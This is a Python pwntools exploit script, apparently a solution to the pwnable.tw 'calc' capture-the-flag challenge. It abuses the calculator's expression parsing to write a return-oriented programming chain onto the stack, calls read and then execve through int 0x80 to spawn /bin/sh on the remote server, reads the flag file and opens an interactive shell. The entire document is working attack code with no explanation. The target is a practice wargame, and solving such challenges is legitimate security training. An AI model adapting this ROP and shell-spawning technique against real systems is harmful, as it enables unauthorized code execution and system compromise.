from pwn import *
def cal(c):
	p.sendline(c)
eax=0x0805c34b
ppp=0x080701d0
int0x80=0x08049a21
read=0x806E6D0
bss=0x080ebf40+0x100
#p=process("./calc")
p=remote("chall.pwnable.tw",10100)
#gdb.attach(p,'b *0x80494a6')
aim=(0xffffd06c-0xffffcaf8)/4+19

cal("+{}+1*{}-1*{}".format(str(aim),str(read+ppp),str(ppp)))
cal("+{}-1*{}-1*{}-1*{}-1*{}+1*{}-1*{}".format(str(aim+2),str(bss),str(bss+100),str(100+ppp),str(ppp),str(1),str(1)))
cal("+{}+1*{}-1*{}+1*{}+1*{}-1*{}".format(str(aim+2+5),str(bss),str(bss-eax),str(eax-0xb),str(0xb+int0x80),str(int0x80)))

p.sendline("nier")
p.send("/bin/sh\x00\n")
sleep(3)
p.sendline("cat /home/calc/flag")
p.interactive()


